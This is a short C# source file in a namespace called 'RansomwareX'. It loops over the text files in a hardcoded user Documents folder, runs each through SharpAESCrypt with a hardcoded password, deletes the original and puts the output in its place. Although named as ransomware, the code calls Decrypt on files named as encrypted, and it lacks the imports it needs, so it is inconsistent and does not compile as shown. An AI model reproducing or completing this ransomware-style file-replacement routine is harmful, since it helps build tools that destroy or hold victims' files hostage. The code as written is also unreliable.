using System;
using SharpAESCrypt;

namespace RansomwareX
{
    class Program
    {
        static void Main(string[] args)
        {
            string dir = @"C:\Users\123\Documents\Tes";
            List<string> files = new List<string>();
            DirectoryInfo d = new DirectoryInfo(dir);

            foreach (var file in d.GetFiles("*.txt"))
            {
                files.Add(file.ToString());
            }

            foreach (string file in files)
            {
                string decrypted_file = dir + "crypted_file.txt";
                SharpAESCrypt.SharpAESCrypt.Decrypt("password", file, decrypted_file);
                File.Delete(file);
                File.Move(decrypted_file, file);
            }
        }
    }
}